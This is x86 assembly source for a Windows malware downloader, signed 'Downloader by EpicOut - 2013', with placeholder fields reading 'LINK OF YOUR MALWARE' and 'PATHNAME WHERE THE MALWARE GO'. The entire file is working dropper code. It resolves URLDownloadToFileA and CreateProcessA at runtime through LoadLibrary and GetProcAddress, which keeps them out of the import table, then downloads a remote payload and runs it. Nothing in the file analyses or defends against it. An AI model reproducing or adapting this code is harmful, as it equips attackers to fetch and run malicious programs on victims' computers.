.386
.model flat, stdcall
option casemap :none  ; case sensitive
  
include windows.inc
  
include kernel32.inc
includelib kernel32.lib
  
  
.data
ExeFile db "LINK OF YOUR MALWARE",0
PathTarget db " PATHNAME WHERE THE MALWARE GO",0
Cryptkey dd 539h
LpStartup STARTUPINFO &lt;>
ProcessInfo PROCESS_INFORMATION &lt;>
dll1 db "urlmon.dll",0
dllfunc1 db "URLDownloadToFileA",0
dll2 db "kernel32.dll",0
dllfunc2 db "CreateProcessA",0
signature db "Downloader by EpicOut - 2013",0
.code
start:
call download
call execute
call exit
  
download:
invoke LoadLibrary,addr dll1
invoke GetProcAddress,eax,addr dllfunc1
push NULL
push 0
push offset PathTarget
push offset ExeFile
push NULL
call eax
ret
  
execute:
invoke LoadLibrary,addr dll2
invoke GetProcAddress,eax,addr dllfunc2
push offset ProcessInfo
push offset LpStartup
push NULL
push NULL
push NULL
push TRUE
push NULL
push NULL
push NULL
push offset PathTarget
call eax
ret
  
exit:
invoke ExitProcess,0
ret
end start
